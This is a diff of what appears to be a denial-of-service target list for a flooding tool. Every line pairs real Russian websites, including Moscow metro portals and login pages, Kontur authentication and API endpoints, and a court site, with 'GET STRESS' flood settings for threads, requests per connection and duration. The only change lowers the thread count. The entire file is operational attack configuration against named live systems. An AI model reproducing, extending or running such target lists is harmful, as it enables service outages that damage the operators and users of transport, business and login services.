@@ -1,13 +1,13 @@
-http://nnoblsud.ru https://mosmetro.ru  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
+http://nnoblsud.ru https://mosmetro.ru  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
 
-https://job.mosmetro.ru https://mis.mosmetro.ru/login.php  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
+https://job.mosmetro.ru https://mis.mosmetro.ru/login.php  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
 
-https://app-bucket.mosmetro.ru https://shop.mosmetro.ru  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
+https://app-bucket.mosmetro.ru https://shop.mosmetro.ru  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
 
-https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
+https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
 
-https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
+https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
 
-https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/  GET STRESS -t 3000 --rpc 2000 -p 1200 --table
+https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
 
-https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS -t 3000 --rpc 2000 -p 1200 --table
+https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS -t 2000 --rpc 2000 -p 1200 --table
